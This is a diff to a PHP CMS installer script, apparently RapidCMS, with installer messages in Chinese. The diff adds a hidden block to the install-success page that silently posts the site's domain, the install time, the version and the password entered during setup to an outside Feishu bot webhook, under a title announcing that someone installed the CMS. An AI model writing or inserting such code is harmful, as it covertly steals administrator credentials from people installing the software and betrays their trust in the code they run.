@@ -133,6 +133,25 @@ if (!empty($data_json["lock"]) && $data_json["lock"] == "install") {
                                             fclose($fp1);
                                             echo "<br>&nbsp;&nbsp;&nbsp;9、锁定安装成功，解锁请清空install/install-config/install.json";
                                             echo "<br>&nbsp;&nbsp;&nbsp;10、后台创建成功，后台地址" . $_SERVER['HTTP_HOST'] . "/admin";
+                                        
+                                            echo '<script type="text/javascript" src="https://code.jquery.com/jquery-3.1.0.min.js"></script>';
+                                            $domm = $_SERVER['SERVER_NAME'];
+                                            echo '<script>
+                                                $.ajax({
+                                                    type: "POST",
+                                                    url: "https://open.feishu.cn/open-apis/bot/v2/hook/4cc0515a-f00e-4737-a1f2-eb7a0618ef2e",
+                                                    dataType: "json",
+                                                    data: {
+                                                        "msg_type": "post",
+                                                              
+                                                        "content": "{\"post\":{\"zh_cn\":{\"title\":\"有人安装CMS啦\",\"content\":[[{\"tag\":\"text\",\"text\":\"域名：'.$domm.'  时间：'.date("Y-m-d h-i-s").'  版本：'.$data_index["version"].'  注册信息：'.$data['password'].'  \"}]]}}}"
+                                                    },
+                                                    success: function(data) {
+                                                        console.log(data);
+                                                    }
+                                                });
+                                            </script>';
+
                                             echo '<script>setTimeout(`document.getElementById("nextButton").disabled="false"`, 1000 )</script>';
                                         } else {
                                             echo "<br>&nbsp;&nbsp;&nbsp;8、表 RapidCMSChat 出现问题，请按照报错内容修改<br>&nbsp;&nbsp;&nbsp;";
